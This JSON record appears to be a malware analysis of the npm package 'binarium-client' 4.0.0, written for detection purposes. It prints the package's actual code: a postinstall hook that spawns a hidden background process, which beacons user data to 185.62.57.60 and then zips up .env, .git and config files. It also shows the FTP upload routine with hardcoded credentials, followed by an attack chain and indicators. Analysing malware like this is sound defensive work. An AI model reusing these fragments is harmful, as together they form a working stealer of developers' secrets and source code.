@@ -1,0 +1,221 @@
+{
+  "package_info": {
+    "package_name": "binarium-client",
+    "package_manager": "npm",
+    "package_versions": "4.0.0",
+    "why_malicious": "The package is explicitly designed to exfiltrate sensitive developer files and directories by compressing them and uploading the resulting archives to a remote FTP server controlled by the attacker. The malicious behavior is triggered automatically upon installation, without user consent, and targets files and directories likely to contain credentials, source code, and configuration data."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "postinstall",
+        "file_location": "package.json",
+        "required_permissions": [
+          "filesystem",
+          "child_process"
+        ]
+      },
+      "code_snippet": "\"postinstall\": \"node preinstall.js\"",
+      "code_language": "json",
+      "code_behavior": "During installation (postinstall), the package executes preinstall.js as a Node.js process, enabling arbitrary code execution immediately after the package is installed.",
+      "malice_analysis": {
+        "why_suspicious": "Running arbitrary scripts at postinstall is a common malware technique to trigger payloads without user interaction.",
+        "violated_expectations": "Legitimate packages rarely require postinstall scripts unless for build or setup tasks, and should never perform actions unrelated to package setup.",
+        "similar_legitimate_use": "Some legitimate packages use postinstall for compiling native modules or downloading dependencies.",
+        "key_indicators": [
+          "postinstall script present",
+          "executes custom JavaScript file"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "postinstall (via preinstall.js)",
+        "file_location": "preinstall.js",
+        "required_permissions": [
+          "child_process"
+        ]
+      },
+      "code_snippet": "const { spawn } = require('child_process');\n\nconst child = spawn('node', ['index.js'], {\n  detached: true,\n  stdio: 'ignore'\n});\n\nchild.unref();",
+      "code_language": "javascript",
+      "code_behavior": "During installation, the code spawns index.js as a detached, background Node.js process, allowing the malicious payload to run independently of the installation process.",
+      "malice_analysis": {
+        "why_suspicious": "Detaching and unreferencing a child process is a stealth technique to ensure the payload continues running even if the installation process ends, making detection and cleanup harder.",
+        "violated_expectations": "Normal postinstall scripts do not spawn persistent background processes unrelated to package setup.",
+        "similar_legitimate_use": "Rarely, legitimate daemons or background services may use similar techniques, but not in general-purpose npm packages.",
+        "key_indicators": [
+          "spawns background process",
+          "detached: true",
+          "stdio: 'ignore'",
+          "child.unref()"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "postinstall (background process)",
+        "file_location": "index.js",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "os",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "function sendHTTPRequest(text) {\n  let query;\n  if (text) {\n    query = querystring.stringify({ text: text });\n  } else {\n    const osUser = os.userInfo().username;\n    const currentScriptPath = process.cwd();\n    query = querystring.stringify({\n      user: osUser,\n      path: currentScriptPath,\n    });\n  }\n\n  const requestUrl = url.format({\n    protocol: \"http\",\n    hostname: \"185.62.57.60\",\n    port: \"8000\",\n    pathname: \"/http\",\n    search: query,\n  });\n\n  http\n    .get(requestUrl, (res) => {\n      let data = \"\";\n      res.on(\"data\", (chunk) => {\n        data += chunk;\n      });\n      res.on(\"end\", () => {});\n    })\n    .on(\"error\", (err) => {});\n}",
+      "code_language": "javascript",
+      "code_behavior": "At runtime (immediately after installation), the code collects the current OS username and working directory, then sends this information via HTTP GET to a hardcoded remote server (185.62.57.60:8000), enabling initial victim identification and possible C2 communication.",
+      "malice_analysis": {
+        "why_suspicious": "Exfiltrating system/user information to an external server is a classic reconnaissance and C2 tactic.",
+        "violated_expectations": "Legitimate packages should not transmit local user or environment data to unknown external servers.",
+        "similar_legitimate_use": "Some telemetry or analytics packages may collect environment info, but always with user consent and to known domains.",
+        "key_indicators": [
+          "hardcoded external IP",
+          "collects username and cwd",
+          "HTTP GET exfiltration"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "postinstall (background process)",
+        "file_location": "index.js",
+        "required_permissions": [
+          "filesystem"
+        ]
+      },
+      "code_snippet": "const extensions = [\n  \".asp\", \".js\", \".php\", \".aspx\", \".jspx\", \".jhtml\", \".py\", \".rb\", \".pl\", \".cfm\", \".cgi\", \".ssjs\", \".shtml\", \".env\", \".ini\", \".conf\", \".properties\", \".yml\", \".cfg\"\n];\nconst directoriesToSearch = [\n  \".git\", \".env\", \".svn\", \".gitlab\", \".hg\", \".idea\", \".yarn\", \".docker\", \".vagrant\", \".github\"\n];\nlet searchedWords = findFilesWithExtensions(\n  startDir,\n  extensions,\n  directoriesToSearch\n);",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, the code recursively searches the filesystem for files with sensitive extensions and for specific configuration/source code directories, collecting paths to these files and directories for later exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "Targeting a wide range of source code and configuration file types is indicative of data theft.",
+        "violated_expectations": "Normal packages do not enumerate or access arbitrary sensitive files and directories outside their own scope.",
+        "similar_legitimate_use": "Backup utilities or migration tools may enumerate files, but only with user consent and clear documentation.",
+        "key_indicators": [
+          "searches for .env, .git, .docker, etc.",
+          "targets source code and config files"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "postinstall (background process)",
+        "file_location": "index.js",
+        "required_permissions": [
+          "filesystem"
+        ]
+      },
+      "code_snippet": "var output = fs.createWriteStream(zip_name);\nconst archive = archiver(\"zip\", {\n  zlib: { level: 9 },\n});\narchive.pipe(output);\nsearchedWords[0].forEach((item) => {\n  files = appendDirectory(item, new_name, archive, zip_name);\n});\nawait archive.finalize();",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, the code creates ZIP archives of the collected sensitive files and directories, preparing them for exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "Packaging sensitive files into archives is a common precursor to data exfiltration.",
+        "violated_expectations": "Legitimate packages should not compress arbitrary user files without explicit user action.",
+        "similar_legitimate_use": "Backup or deployment tools may create archives, but only with user intent.",
+        "key_indicators": [
+          "creates ZIPs of sensitive files",
+          "archives files outside package scope"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_6",
+      "execution_context": {
+        "trigger": "postinstall (background process)",
+        "file_location": "index.js",
+        "required_permissions": [
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "function uploadArchiveToFTP(archiveName) {\n  return new Promise((resolve, reject) => {\n    const client = new ftpClient();\n    const host = \"185.62.57.60\";\n    const port = 21;\n    const user = \"root\";\n    const password = \"TestX@!#33\";\n    const remotePath = \"/\";\n    const localPath = path.join(process.cwd(), archiveName);\n    client.on(\"ready\", () => {\n      client.put(localPath, remotePath + archiveName, (err) => {\n        if (err) {\n          return;\n        }\n        client.end();\n        resolve();\n      });\n    });\n\n    client.connect({ host, port, user, password });\n  });\n}",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, the code uploads the created ZIP archives containing sensitive files to a remote FTP server (185.62.57.60) using hardcoded credentials, completing the exfiltration of developer data.",
+      "malice_analysis": {
+        "why_suspicious": "Uploading user data to an external FTP server is a clear exfiltration technique.",
+        "violated_expectations": "Legitimate packages should never transmit user files to unknown servers without explicit user consent.",
+        "similar_legitimate_use": "Automated backup tools may upload to user-configured FTP servers, but never to hardcoded attacker infrastructure.",
+        "key_indicators": [
+          "hardcoded FTP server and credentials",
+          "uploads ZIPs of sensitive files"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Upon installation, the postinstall script triggers execution of preinstall.js.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Execution of preinstall.js"
+    },
+    {
+      "step": 2,
+      "action": "preinstall.js spawns index.js as a detached background process.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "index.js runs independently in the background"
+    },
+    {
+      "step": 3,
+      "action": "index.js collects the current OS username and working directory, sending them to the attacker's server via HTTP GET.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Attacker receives initial victim info"
+    },
+    {
+      "step": 4,
+      "action": "index.js recursively searches for sensitive files and directories on the victim's machine.",
+      "implemented_by": [
+        "snippet_4"
+      ],
+      "leads_to": "Sensitive files and directories are identified"
+    },
+    {
+      "step": 5,
+      "action": "index.js creates ZIP archives of the discovered files and directories.",
+      "implemented_by": [
+        "snippet_5"
+      ],
+      "leads_to": "Sensitive data is packaged for exfiltration"
+    },
+    {
+      "step": 6,
+      "action": "index.js uploads the ZIP archives to a remote FTP server controlled by the attacker.",
+      "implemented_by": [
+        "snippet_6"
+      ],
+      "leads_to": "Attacker receives exfiltrated data (final goal)"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "postinstall script execution of custom JavaScript",
+      "spawning detached background Node.js processes during install",
+      "filesystem enumeration for sensitive file extensions and directories",
+      "creation of ZIP archives containing files outside the package directory",
+      "network connections to hardcoded external IPs (HTTP/FTP) immediately after install",
+      "FTP uploads of newly created ZIP files"
+    ],
+    "file_indicators": [
+      "preinstall.js executed via postinstall",
+      "index.js containing archiver, ftp, and os modules",
+      "ZIP files named dirs_back.zip, files_back.zip, specific_directories.zip, dir.zip created in working directory"
+    ],
+    "network_indicators": [
+      "HTTP GET requests to 185.62.57.60:8000",
+      "FTP connections to 185.62.57.60:21 with username 'root'",
+      "Outbound connections to hardcoded IPs immediately after npm install"
+    ],
+    "how_to_detect": "Monitor for npm packages that define postinstall scripts executing custom JavaScript files. Flag packages that spawn detached background processes or access files outside their own directory. Detect creation of ZIP archives containing sensitive files (e.g., .env, .git, .docker) in the working directory. Alert on outbound HTTP/FTP connections to hardcoded or suspicious IP addresses, especially immediately following package installation. Correlate these behaviors to identify malicious exfiltration activity."
+  }
+}
